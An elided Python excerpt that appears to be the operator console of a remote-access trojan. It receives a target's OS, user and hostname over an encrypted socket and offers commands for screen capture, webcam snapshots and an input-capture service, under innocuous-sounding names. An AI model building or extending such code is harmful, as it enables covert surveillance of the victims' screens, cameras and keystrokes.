...
class st_winshell(cmd.Cmd):
    ...
    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
        ...
        self.cli_os = meeting_platform_lib.st_receive(socket, aes_key)
        self.cli_user = meeting_platform_lib.st_receive(socket, aes_key)
        self.cli_hostname = meeting_platform_lib.st_receive(socket, aes_key)
        self.cli_platform = meeting_platform_lib.st_receive(socket, aes_key)
        self.stlib = meeting_platform_lib.meeting_platform_commands_library(socket, target, port, aes_key,
                                        self.cli_os,
                                        self.cli_platform,
                                        self.cli_hostname,
                                        self.cli_user,
...
################################################################################
    ...
    def do_screen_capture(self,line): self.stlib.screen_capture()
    ...
    def do_camera_servicesnap(self,line): self.stlib.camera_servicesnap(line)

    def do_camera_servicelist(self,line): self.stlib.camera_servicelist()
...
################################################################################
    ...
    def do_input_service(self,line): self.stlib.input_service(line)
...
################################################################################
    ...
    def complete_input_service(self, text, line, begidx, endidx):
        return find_completion(text,options_input_service)
...
################################################################################
    ...
    def help_input_service(self): st_help_input_service()
    ...
    def help_screen_capture(self): st_help_screen_capture()
    ...
    def help_camera_servicesnap(self): st_help_camera_servicesnap()

    def help_camera_servicelist(self): st_help_camera_servicelist()
